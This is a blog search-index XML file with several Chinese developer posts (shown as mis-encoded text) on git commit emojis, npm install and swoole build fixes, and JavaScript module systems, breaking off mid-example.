<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Git commit è¡¨æƒ…ç¬¦å·</title>
      <link href="post/2b9c5c01/"/>
      <url>post/2b9c5c01/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‰§è¡Œ git commit æ—¶ä½¿ç”¨ emoji ä¸ºæœ¬æ¬¡æäº¤æ‰“ä¸Šä¸€ä¸ª â€œæ ‡ç­¾â€, ä½¿å¾—æ­¤æ¬¡ commit çš„ä¸»è¦å·¥ä½œå¾—ä»¥å‡¸ç°ï¼Œä¹Ÿèƒ½å¤Ÿä½¿å¾—å…¶åœ¨æ•´ä¸ªæäº¤å†å²ä¸­æ˜“äºåŒºåˆ†ä¸æŸ¥æ‰¾ã€‚</p><span id="more"></span><h2 id="commit-æ ¼å¼"><a href="#commit-æ ¼å¼" class="headerlink" title="commit æ ¼å¼"></a>commit æ ¼å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git commit æ—¶ï¼Œæäº¤ä¿¡æ¯éµå¾ªä»¥ä¸‹æ ¼å¼ï¼š</span><br><span class="line"></span><br><span class="line">:emoji1: :emoji2: ä¸è¶…è¿‡ 50 ä¸ªå­—çš„æ‘˜è¦ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œä½¿ç”¨ç¥ˆä½¿è¯­æ°”ï¼Œå¥æœ«ä¸è¦åŠ å¥å·</span><br><span class="line"></span><br><span class="line">æäº¤ä¿¡æ¯ä¸»ä½“</span><br><span class="line"></span><br><span class="line">å¼•ç”¨ç›¸å…³ issue æˆ– PR ç¼–å· &lt;#110&gt;</span><br></pre></td></tr></table></figure><p>åˆæ¬¡æäº¤ç¤ºä¾‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;:tada: Initialize Repo&quot;</span></span><br></pre></td></tr></table></figure><h2 id="emoji-æŒ‡å—"><a href="#emoji-æŒ‡å—" class="headerlink" title="emoji æŒ‡å—"></a>emoji æŒ‡å—</h2><table><thead><tr><th>emoji</th><th>emoji ä»£ç </th><th>commit è¯´æ˜</th></tr></thead><tbody><tr><td>ğŸ‰ (åº†ç¥)</td><td>:tada:</td><td>åˆæ¬¡æäº¤</td></tr><tr><td>ğŸ†• (å…¨æ–°)</td><td>:new:</td><td>å¼•å…¥æ–°åŠŸèƒ½</td></tr><tr><td>ğŸ”– (ä¹¦ç­¾)</td><td>:bookmark:</td><td>å‘è¡Œ/ç‰ˆæœ¬æ ‡ç­¾</td></tr><tr><td>ğŸ› (bug)</td><td>:bug:</td><td>ä¿®å¤ bug</td></tr><tr><td>ğŸš‘ (æ€¥æ•‘è½¦)</td><td>:ambulance:</td><td>é‡è¦è¡¥ä¸</td></tr><tr><td>ğŸŒ (åœ°çƒ)</td><td>:globe_with_meridians:</td><td>å›½é™…åŒ–ä¸æœ¬åœ°åŒ–</td></tr><tr><td>ğŸ’„ (å£çº¢)</td><td>:lipstick:</td><td>æ›´æ–° UI å’Œæ ·å¼æ–‡ä»¶</td></tr><tr><td>ğŸ¬ (åœºè®°æ¿)</td><td>:clapper:</td><td>æ›´æ–°æ¼”ç¤º/ç¤ºä¾‹</td></tr><tr><td>ğŸš¨ (è­¦è½¦ç¯)</td><td>:rotating_light:</td><td>ç§»é™¤ linter è­¦å‘Š</td></tr><tr><td>ğŸ”§ (æ‰³æ‰‹)</td><td>:wrench:</td><td>ä¿®æ”¹é…ç½®æ–‡ä»¶</td></tr><tr><td>â• (åŠ å·)</td><td>:heavy_plus_sign:</td><td>å¢åŠ ä¸€ä¸ªä¾èµ–</td></tr><tr><td>â– (å‡å·)</td><td>:heavy_minus_sign:</td><td>å‡å°‘ä¸€ä¸ªä¾èµ–</td></tr><tr><td>â¬†ï¸ (ä¸Šå‡ç®­å¤´)</td><td>:arrow_up:</td><td>å‡çº§ä¾èµ–</td></tr><tr><td>â¬‡ï¸ (ä¸‹é™ç®­å¤´)</td><td>:arrow_down:</td><td>é™çº§ä¾èµ–</td></tr><tr><td>âš¡ (é—ªç”µ) ğŸ (èµ›é©¬)</td><td>:zap: :racehorse:</td><td>æå‡æ€§èƒ½</td></tr><tr><td>ğŸ“ˆ (ä¸Šå‡è¶‹åŠ¿å›¾)</td><td>:chart_with_upwards_trend:</td><td>æ·»åŠ åˆ†ææˆ–è·Ÿè¸ªä»£ç </td></tr><tr><td>ğŸš€ (ç«ç®­)</td><td>:rocket:</td><td>éƒ¨ç½²åŠŸèƒ½</td></tr><tr><td>âœ… (ç™½è‰²å¤é€‰æ¡†)</td><td>:white_check_mark:</td><td>å¢åŠ æµ‹è¯•</td></tr><tr><td>ğŸ“ (å¤‡å¿˜å½•) ğŸ“– (ä¹¦)</td><td>:memo: :book:</td><td>æ’°å†™æ–‡æ¡£</td></tr><tr><td>ğŸ”¨ (é”¤å­)</td><td>:hammer:</td><td>é‡å¤§é‡æ„</td></tr><tr><td>ğŸ¨ (è°ƒè‰²æ¿)</td><td>:art:</td><td>æ”¹è¿›ä»£ç ç»“æ„/ä»£ç æ ¼å¼</td></tr><tr><td>ğŸ”¥ (ç«ç„°)</td><td>:fire:</td><td>ç§»é™¤ä»£ç æˆ–æ–‡ä»¶</td></tr><tr><td>âœï¸ (é“…ç¬”)</td><td>:pencil2:</td><td>ä¿®å¤ typo</td></tr><tr><td>ğŸš§ (æ–½å·¥)</td><td>:construction:</td><td>å·¥ä½œè¿›è¡Œä¸­</td></tr><tr><td>ğŸ—‘ï¸ (åƒåœ¾æ¡¶)</td><td>:wastebasket:</td><td>åºŸå¼ƒæˆ–åˆ é™¤</td></tr><tr><td>â™¿ (è½®æ¤…)</td><td>:wheelchair:</td><td>å¯è®¿é—®æ€§</td></tr><tr><td>ğŸ‘· (å·¥äºº)</td><td>:construction_worker:</td><td>æ·»åŠ  CI æ„å»ºç³»ç»Ÿ</td></tr><tr><td>ğŸ’š (ç»¿å¿ƒ)</td><td>:green_heart:</td><td>ä¿®å¤ CI æ„å»ºé—®é¢˜</td></tr><tr><td>ğŸ”’ (é”)</td><td>:lock:</td><td>ä¿®å¤å®‰å…¨é—®é¢˜</td></tr><tr><td>ğŸ³ (é²¸é±¼)</td><td>:whale:</td><td>Docker ç›¸å…³å·¥ä½œ</td></tr><tr><td>ğŸ (è‹¹æœ)</td><td>:apple:</td><td>ä¿®å¤ macOS ä¸‹çš„é—®é¢˜</td></tr><tr><td>ğŸ§ (ä¼é¹…)</td><td>:penguin:</td><td>ä¿®å¤ Linux ä¸‹çš„é—®é¢˜</td></tr><tr><td>ğŸ (æ——å¸œ)</td><td>:checkered_flag:</td><td>ä¿®å¤ Windows ä¸‹çš„é—®é¢˜</td></tr><tr><td>ğŸ”€ (äº¤å‰ç®­å¤´)</td><td>:twisted_rightwards_arrows:</td><td>åˆ†æ”¯åˆå¹¶</td></tr></tbody></table><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>â— <a href="https://github.com/liuchengxu/git-commit-emoji-cn">https://github.com/liuchengxu/git-commit-emoji-cn</a></p>]]></content>
      
      
      <categories>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm install å¡ä½</title>
      <link href="post/3a12d989/"/>
      <url>post/3a12d989/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>npm install</code> å®‰è£…ç¼“æ…¢å¤±è´¥è§£å†³æ–¹æ¡ˆ</p><span id="more"></span><h2 id="é•œåƒé—®é¢˜"><a href="#é•œåƒé—®é¢˜" class="headerlink" title="é•œåƒé—®é¢˜"></a>é•œåƒé—®é¢˜</h2><p>æ›´æ¢æˆä¸­å›½çš„é•œåƒç«™åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><h2 id="GITé—®é¢˜"><a href="#GITé—®é¢˜" class="headerlink" title="GITé—®é¢˜"></a>GITé—®é¢˜</h2><p>æ›´æ”¹gitçš„gitåè®®ä¸ºhttps</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global url.<span class="string">&quot;https://&quot;</span>.insteadOf git://</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac pecl swoole openssl é”™è¯¯</title>
      <link href="post/ab17a67d/"/>
      <url>post/ab17a67d/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/private/tmp/pear/temp/swoole/ext-src/php_swoole_private.h:84:2: error: <span class="string">&quot;Enable openssl support, require openssl library&quot;</span></span><br><span class="line"><span class="comment">#error &quot;Enable openssl support, require openssl library&quot;</span></span><br><span class="line"> ^</span><br><span class="line">In file included from /private/tmp/pear/temp/swoole/ext-src/php_swoole.cc:16:</span><br><span class="line">In file included from /private/tmp/pear/temp/swoole/ext-src/php_swoole_cxx.h:20:</span><br><span class="line">In file included from /private/tmp/pear/temp/swoole/ext-src/php_swoole_coroutine.h:22:</span><br><span class="line">In file included from /private/tmp/pear/temp/swoole/include/swoole_coroutine.h:22:</span><br><span class="line">In file included from /private/tmp/pear/temp/swoole/include/swoole_socket.h:33:</span><br><span class="line">/private/tmp/pear/temp/swoole/include/swoole_ssl.h:27:10: fatal error: <span class="string">&#x27;openssl/ssl.h&#x27;</span> file not found</span><br><span class="line"><span class="comment">#include &lt;openssl/ssl.h&gt;</span></span><br><span class="line">         ^~~~~~~~~~~~~~~</span><br><span class="line">2 errors generated.</span><br><span class="line">make: *** [ext-src/php_swoole.lo] Error 1</span><br><span class="line">ERROR: `make<span class="string">&#x27; failed</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enable</span> openssl support? [no] : yes --with-openssl-dir=/usr/<span class="built_in">local</span>/opt/openssl</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonJS,AMD,CMD,ES6</title>
      <link href="post/1255fdd2/"/>
      <url>post/1255fdd2/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¨¡å—åŒ–çš„å¼€å‘æ–¹å¼å¯ä»¥æé«˜ä»£ç å¤ç”¨ç‡ï¼Œæ–¹ä¾¿è¿›è¡Œä»£ç çš„ç®¡ç†ã€‚é€šå¸¸ä¸€ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæœ‰è‡ªå·±çš„ä½œç”¨åŸŸï¼Œåªå‘å¤–æš´éœ²ç‰¹å®šçš„å˜é‡å’Œå‡½æ•°ã€‚ç›®å‰æµè¡Œçš„ js æ¨¡å—åŒ–è§„èŒƒæœ‰ CommonJSã€AMDã€CMD ä»¥åŠ ES6 çš„æ¨¡å—ç³»ç»Ÿã€‚</p><span id="more"></span><h2 id="Common-JS"><a href="#Common-JS" class="headerlink" title="Common JS"></a>Common JS</h2><p>Node.js æ˜¯ commonJS è§„èŒƒçš„ä¸»è¦å®è·µè€…ï¼Œå®ƒæœ‰å››ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡ä¸ºæ¨¡å—åŒ–çš„å®ç°æä¾›æ”¯æŒï¼šmoduleã€exportsã€requireã€globalã€‚å®é™…ä½¿ç”¨æ—¶ï¼Œç”¨module.exportså®šä¹‰å½“å‰æ¨¡å—å¯¹å¤–è¾“å‡ºçš„æ¥å£ï¼ˆä¸æ¨èç›´æ¥ç”¨exportsï¼‰ï¼Œç”¨requireåŠ è½½æ¨¡å—ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰æ¨¡å—math.js</span></span><br><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123; <span class="comment">//åœ¨è¿™é‡Œå†™ä¸Šéœ€è¦å‘å¤–æš´éœ²çš„å‡½æ•°ã€å˜é‡</span></span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">basicNum</span>: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•ç”¨è‡ªå®šä¹‰çš„æ¨¡å—æ—¶ï¼Œå‚æ•°åŒ…å«è·¯å¾„ï¼Œå¯çœç•¥.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>);</span><br><span class="line">math.add(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•ç”¨æ ¸å¿ƒæ¨¡å—æ—¶ï¼Œä¸éœ€è¦å¸¦è·¯å¾„</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">http.createService(...).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>commonJS ç”¨åŒæ­¥çš„æ–¹å¼åŠ è½½æ¨¡å—ã€‚åœ¨æœåŠ¡ç«¯ï¼Œæ¨¡å—æ–‡ä»¶éƒ½å­˜åœ¨æœ¬åœ°ç£ç›˜ï¼Œè¯»å–éå¸¸å¿«ï¼Œæ‰€ä»¥è¿™æ ·åšä¸ä¼šæœ‰é—®é¢˜ã€‚ä½†æ˜¯åœ¨æµè§ˆå™¨ç«¯ï¼Œé™äºç½‘ç»œåŸå› ï¼Œæ›´åˆç†çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨å¼‚æ­¥åŠ è½½ã€‚</p><h2 id="AMD-å’Œ-require-js"><a href="#AMD-å’Œ-require-js" class="headerlink" title="AMD å’Œ require.js"></a>AMD å’Œ require.js</h2><p>AMD è§„èŒƒé‡‡ç”¨å¼‚æ­¥æ–¹å¼åŠ è½½æ¨¡å—ï¼Œæ¨¡å—çš„åŠ è½½ä¸å½±å“å®ƒåé¢è¯­å¥çš„è¿è¡Œã€‚æ‰€æœ‰ä¾èµ–è¿™ä¸ªæ¨¡å—çš„è¯­å¥ï¼Œéƒ½å®šä¹‰åœ¨ä¸€ä¸ªå›è°ƒå‡½æ•°ä¸­ï¼Œç­‰åˆ°åŠ è½½å®Œæˆä¹‹åï¼Œè¿™ä¸ªå›è°ƒå‡½æ•°æ‰ä¼šè¿è¡Œã€‚è¿™é‡Œä»‹ç»ç”¨ require.js å®ç° AMD è§„èŒƒçš„æ¨¡å—åŒ–ï¼šç”¨require.config()æŒ‡å®šå¼•ç”¨è·¯å¾„ç­‰ï¼Œç”¨define()å®šä¹‰æ¨¡å—ï¼Œç”¨require()åŠ è½½æ¨¡å—ã€‚</p><p>é¦–å…ˆéœ€è¦å¼•å…¥ require.js æ–‡ä»¶å’Œä¸€ä¸ªå…¥å£æ–‡ä»¶ main.jsã€‚main.js ä¸­é…ç½®require.config()å¹¶è§„å®šé¡¹ç›®ä¸­ç”¨åˆ°çš„åŸºç¡€æ¨¡å—ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** ç½‘é¡µä¸­å¼•å…¥require.jsåŠmain.js **/</span></span><br><span class="line">&lt;script src=<span class="string">&quot;js/require.js&quot;</span> data-main=<span class="string">&quot;js/main&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** main.js å…¥å£æ–‡ä»¶/ä¸»æ¨¡å— **/</span></span><br><span class="line"><span class="comment">// é¦–å…ˆç”¨config()æŒ‡å®šå„æ¨¡å—è·¯å¾„å’Œå¼•ç”¨å</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">  <span class="attr">baseUrl</span>: <span class="string">&quot;js/lib&quot;</span>,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="string">&quot;jquery&quot;</span>: <span class="string">&quot;jquery.min&quot;</span>,  <span class="comment">//å®é™…è·¯å¾„ä¸ºjs/lib/jquery.min.js</span></span><br><span class="line">    <span class="string">&quot;underscore&quot;</span>: <span class="string">&quot;underscore.min&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// æ‰§è¡ŒåŸºæœ¬æ“ä½œ</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">&quot;jquery&quot;</span>,<span class="string">&quot;underscore&quot;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$,_</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// some code here</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¼•ç”¨æ¨¡å—çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°†æ¨¡å—åæ”¾åœ¨[]ä¸­ä½œä¸ºreqiure()çš„ç¬¬ä¸€å‚æ•°ï¼›å¦‚æœæˆ‘ä»¬å®šä¹‰çš„æ¨¡å—æœ¬èº«ä¹Ÿä¾èµ–å…¶ä»–æ¨¡å—, é‚£å°±éœ€è¦å°†å®ƒä»¬æ”¾åœ¨[]ä¸­ä½œä¸ºdefine()çš„ç¬¬ä¸€å‚æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰math.jsæ¨¡å—</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">add</span>: add,</span><br><span class="line">        <span class="attr">basicNum</span> :basicNum</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªä¾èµ–underscore.jsçš„æ¨¡å—</span></span><br><span class="line">define([<span class="string">&#x27;underscore&#x27;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">_</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> classify = <span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</span><br><span class="line">    _.countBy(list,<span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> num &gt; <span class="number">30</span> ? <span class="string">&#x27;old&#x27;</span> : <span class="string">&#x27;young&#x27;</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">classify</span> :classify</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•ç”¨æ¨¡å—ï¼Œå°†æ¨¡å—æ”¾åœ¨[]å†…</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">&#x27;jquery&#x27;</span>, <span class="string">&#x27;math&#x27;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$, math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">  $(<span class="string">&quot;#sum&quot;</span>).html(sum);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="CMD-å’Œ-sea-js"><a href="#CMD-å’Œ-sea-js" class="headerlink" title="CMD å’Œ sea.js"></a>CMD å’Œ sea.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.js åœ¨ç”³æ˜ä¾èµ–çš„æ¨¡å—æ—¶ä¼šåœ¨ç¬¬ä¸€ä¹‹é—´åŠ è½½å¹¶æ‰§è¡Œæ¨¡å—å†…çš„ä»£ç ï¼š</span><br><span class="line">define([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c, d, e, f</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ç­‰äºåœ¨æœ€å‰é¢å£°æ˜å¹¶åˆå§‹åŒ–äº†è¦ç”¨åˆ°çš„æ‰€æœ‰æ¨¡å—</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="comment">// å³ä¾¿æ²¡ç”¨åˆ°æŸä¸ªæ¨¡å— bï¼Œä½† b è¿˜æ˜¯æå‰æ‰§è¡Œäº†</span></span><br><span class="line">      b.foo()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>CMD æ˜¯å¦ä¸€ç§ js æ¨¡å—åŒ–æ–¹æ¡ˆï¼Œå®ƒä¸ AMD å¾ˆç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºï¼šAMD æ¨å´‡ä¾èµ–å‰ç½®ã€æå‰æ‰§è¡Œï¼ŒCMD æ¨å´‡ä¾èµ–å°±è¿‘ã€å»¶è¿Ÿæ‰§è¡Œã€‚æ­¤è§„èŒƒå…¶å®æ˜¯åœ¨ sea.js æ¨å¹¿è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** AMDå†™æ³• **/</span></span><br><span class="line">define([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c, d, e, f</span>) </span>&#123;</span><br><span class="line">     <span class="comment">// ç­‰äºåœ¨æœ€å‰é¢å£°æ˜å¹¶åˆå§‹åŒ–äº†è¦ç”¨åˆ°çš„æ‰€æœ‰æ¨¡å—</span></span><br><span class="line">    a.doSomething();</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// å³ä¾¿æ²¡ç”¨åˆ°æŸä¸ªæ¨¡å— bï¼Œä½† b è¿˜æ˜¯æå‰æ‰§è¡Œäº†</span></span><br><span class="line">        b.doSomething()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** CMDå†™æ³• **/</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="built_in">module</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./a&#x27;</span>); <span class="comment">//åœ¨éœ€è¦æ—¶ç”³æ˜</span></span><br><span class="line">    a.doSomething();</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./b&#x27;</span>);</span><br><span class="line">        b.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** sea.js **/</span></span><br><span class="line"><span class="comment">// å®šä¹‰æ¨¡å— math.js</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="built_in">module</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;jquery.js&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exports</span>.add = add;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// åŠ è½½æ¨¡å—</span></span><br><span class="line">seajs.use([<span class="string">&#x27;math.js&#x27;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">math</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = math.add(<span class="number">1</span>+<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="ES6-Module"><a href="#ES6-Module" class="headerlink" title="ES6 Module"></a>ES6 Module</h2><p>ES6 åœ¨è¯­è¨€æ ‡å‡†çš„å±‚é¢ä¸Šï¼Œå®ç°äº†æ¨¡å—åŠŸèƒ½ï¼Œè€Œä¸”å®ç°å¾—ç›¸å½“ç®€å•ï¼Œæ—¨åœ¨æˆä¸ºæµè§ˆå™¨å’ŒæœåŠ¡å™¨é€šç”¨çš„æ¨¡å—è§£å†³æ–¹æ¡ˆã€‚å…¶æ¨¡å—åŠŸèƒ½ä¸»è¦ç”±ä¸¤ä¸ªå‘½ä»¤æ„æˆï¼šexportå’Œimportã€‚exportå‘½ä»¤ç”¨äºè§„å®šæ¨¡å—çš„å¯¹å¤–æ¥å£ï¼Œimportå‘½ä»¤ç”¨äºè¾“å…¥å…¶ä»–æ¨¡å—æä¾›çš„åŠŸèƒ½ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** å®šä¹‰æ¨¡å— math.js **/</span></span><br><span class="line"><span class="keyword">var</span> basicNum = 